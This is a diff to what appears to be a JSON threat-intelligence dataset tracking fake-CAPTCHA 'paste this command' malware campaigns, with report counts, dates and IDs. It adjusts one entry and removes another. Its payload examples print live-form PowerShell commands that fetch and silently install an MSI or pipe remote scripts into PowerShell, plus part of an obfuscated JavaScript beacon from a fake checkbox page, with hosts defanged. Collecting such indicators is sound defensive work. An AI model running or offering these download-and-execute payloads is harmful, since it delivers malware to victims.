@@ -680,13 +680,10 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 10,
-    "ReportCount": 97,
-    "FirstSeen": "2026-11-11T16:15:01.776000+00:00",
+    "ReportCount": 94,
+    "FirstSeen": "2026-11-11T16:52:18.178000+00:00",
     "LastSeen": "2026-11-18T14:54:44.454000+00:00",
     "ReportIds": [
-      "cmwcbl5u006vv0omlb42loz7x",
-      "cmwcc4tsn071c0omltwru33xb",
-      "cmwcc66iw07310omlt924pkt8",
       "cmwccx3dt078o0omlivx66n50",
       "cmwccy95x079g0omlvd2ccsb6",
       "cmwcqagtk0c4n0omldm3v34fw",
@@ -1219,19 +1216,6 @@
     ],
     "PayloadExamples": [
       "powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/quiet', '/norestart' -Wait; exit\" powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/quiet', '/norestart' -Wait; exit\" powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\\\sc.msi, ' powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/q powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\\\sc."
-    ]
-  },
-  {
-    "Pattern": "powershell -c \\\"irm '<URL>'|powershell -\\\"\"; (function(){var C=\"8008b4f134704bdd\",B=\"<URL>\";var FS=0,HC=0,OBF=1,AFTER=\"close\",REDIR=\"\";function _pg(){try{return{page:location.href||\"\",ref:document.referrer||\"\"};}catch(e){return{page:\"\",ref:\"\"};}}function pb(ev,nt){try{var pg=_pg();var u=B+\"/api/js/beacon/\"+encodeURIComponent(C)+\"?event=\"+encodeURIComponent(ev)+\"&note=\"+encodeURIComponent(nt||\"\")+\"&page=\"+encodeURIComponent(pg.page)+\"&ref=\"+encodeURIComponent(pg.ref)+\"&_=\"+Date.now();var s=document.createElement(\"script\");s.src=u;s.async=true;document.head.appendChild(s);}catch(e){}}window.__panelBeacon=pb;function _capClick(t){if(!t)return false;if(t.id===\"cfm-cb\"||t.id===\"cfm-ck\")return true;if(t.closest&&(t.closest(\"#cfm-cb\")||t.closest(\"#cfm-ck\")||t.closest(\".checkbox-window\")||t.closest(\".checkbox-container\")))return true;return false;}function _rid(n){var c='abcdefghijklmnopqrstuvwxyz0123456789',s='';for(var i=0;i",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-11T16:07:10.237000+00:00",
-    "LastSeen": "2026-11-11T16:07:10.237000+00:00",
-    "ReportIds": [
-      "cmwcbb1wp06p00omllkagp0ih"
-    ],
-    "PayloadExamples": [
-      "powershell -c \\\"irm 'https://content-collector[.]com/dYjJs2gGewlXGMKe'|powershell -\\\"\"; (function(){var C=\"8008b4f134704bdd\",B=\"https://js-staticdelivery[.]com\";var FS=0,HC=0,OBF=1,AFTER=\"close\",REDIR=\"\";function _pg(){try{return{page:location.href||\"\",ref:document.referrer||\"\"};}catch(e){return{page:\"\",ref:\"\"};}}function pb(ev,nt){try{var pg=_pg();var u=B+\"/api/js/beacon/\"+encodeURIComponent(C)+\"?event=\"+encodeURIComponent(ev)+\"&note=\"+encodeURIComponent(nt||\"\")+\"&page=\"+encodeURIComponent(pg[.]page)+\"&ref=\"+encodeURIComponent(pg.ref)+\"&_=\"+Date.now();var s=document.createElement(\"script\");s.src=u;s.async=true;document.head.appendChild(s);}catch(e){}}window.__panelBeacon=pb;function _capClick(t){if(!t)return false;if(t.id===\"cfm-cb\"||t.id===\"cfm-ck\")return true;if(t.closest&&(t.closest(\"#cfm-cb\")||t.closest(\"#cfm-ck\")||t.closest(\".checkbox-window\")||t.closest(\".checkbox-container\")))return true;return false;}function _rid(n){var c='abcdefghijklmnopqrstuvwxyz0123456789',s='';for(var i=0;i"
     ]
   },
   {
